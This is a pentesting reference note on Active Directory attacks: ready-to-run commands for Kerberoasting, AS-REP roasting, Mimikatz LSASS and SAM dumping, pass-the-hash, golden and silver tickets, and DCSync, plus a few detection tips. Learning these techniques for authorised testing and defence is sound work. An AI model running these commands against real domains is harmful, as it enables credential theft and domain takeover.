---
title: Active Directory Attacks
category: techniques
tags: [security, active-directory, kerberos, mimikatz, bloodhound, pentesting]
---

# Active Directory Attacks

Active Directory attack techniques: LDAP enumeration, BloodHound attack path analysis, Kerberoasting, AS-REP Roasting, Pass-the-Hash/Ticket, Golden/Silver Tickets, DCSync, and credential harvesting with Mimikatz.

## Key Facts
- BloodHound visualizes shortest path to Domain Admin - essential for AD pentesting
- Kerberoasting targets service accounts with SPNs and weak passwords
- Golden Ticket = forged TGT granting unlimited domain access; survives password resets (except double KRBTGT reset)
- DCSync requires Replicating Directory Changes permission (Domain Admins, DC accounts)
- Mimikatz extracts cleartext passwords from LSASS memory (if WDigest is enabled)

## LDAP Enumeration
```bash
# ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -b "dc=corp,dc=local" \
  -s sub "(objectClass=user)"

# BloodHound data collection
bloodhound-python -c All -u user -p password -d corp.local -ns 10.0.0.1
# Import into BloodHound GUI -> "Shortest Path to Domain Admin"
```

BloodHound maps: users, groups, computers, sessions, ACLs, trusts. Finds attack paths invisible to manual analysis.

## Kerberoasting
Extract service account TGS tickets and crack offline:
```bash
# Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.0.1 -request

# Crack with hashcat
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```
Targets: service accounts with SPNs that have weak passwords. Any domain user can request TGS tickets for any SPN.

## AS-REP Roasting
Target accounts with "Do not require Kerberos pre-authentication":
```bash
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -no-pass
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

## Credential Harvesting with Mimikatz
```sql
privilege::debug                        # Get debug privilege
sekurlsa::logonpasswords               # Dump cleartext passwords from LSASS
sekurlsa::wdigest                      # WDigest passwords
lsadump::sam                           # Dump local SAM database
lsadump::dcsync /user:Administrator    # DCSync attack
lsadump::dcsync /domain:corp.local /all # All domain hashes
```

## Pass-the-Hash (PtH)
Authenticate using NTLM hash without knowing the password:
```bash
# Impacket
psexec.py -hashes :NTLM_HASH Administrator@10.0.0.1
wmiexec.py -hashes :NTLM_HASH Administrator@10.0.0.1
```

## Pass-the-Ticket (PtT)
```python
# Export ticket from memory (Mimikatz)
kerberos::list /export
# Import on another machine
kerberos::ptt ticket.kirbi
```

## Golden Ticket
Forged TGT with domain admin privileges. Requires KRBTGT NTLM hash + Domain SID:
```bash
kerberos::golden /user:FakeAdmin /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:HASH /ptt
```
- Grants unlimited domain access
- Valid for 10 years by default
- Survives all password resets except double KRBTGT reset (reset twice, 12+ hours apart)

## Silver Ticket
Forged TGS for a specific service (does not contact KDC):
```bash
kerberos::golden /user:FakeUser /domain:corp.local \
  /sid:S-1-5-21-... /target:server.corp.local \
  /service:cifs /rc4:SERVICE_HASH /ptt
```

## DCSync
Replicate domain controller data to extract all password hashes:
```bash
secretsdump.py corp.local/admin:password@10.0.0.1
```
Requires: Replicating Directory Changes permission (Domain Admins, DC machine accounts by default).

## AD Structure Quick Reference
- **Forest** - top-level trust boundary
- **Domain** - administrative boundary within forest
- **OU** - organizational container, GPO linking target
- **Trusts** - relationships between domains (one-way, two-way, transitive)
- **GPO** - Group Policy Objects, applied hierarchically: Local -> Site -> Domain -> OU

## Gotchas
- Kerberoasting is undetectable by default - only visible if TGS request auditing is enabled (Event ID 4769)
- Golden Ticket detection requires monitoring for TGT anomalies (event ID 4768 with unexpected encryption type)
- Pass-the-Hash works even with NTLM disabled if cached hashes exist
- BloodHound data collection itself generates detectable LDAP queries
- Service accounts often have Domain Admin privileges and never-expiring passwords - prime targets
- DCSync from a compromised DC machine account is legitimate replication traffic - very hard to detect

## See Also
- [[authentication-and-authorization]] - Kerberos protocol details
- [[privilege-escalation-techniques]] - local privesc before domain attacks
- [[windows-security-and-powershell]] - Windows event IDs, registry, hardening
- [[penetration-testing-methodology]] - full testing workflow
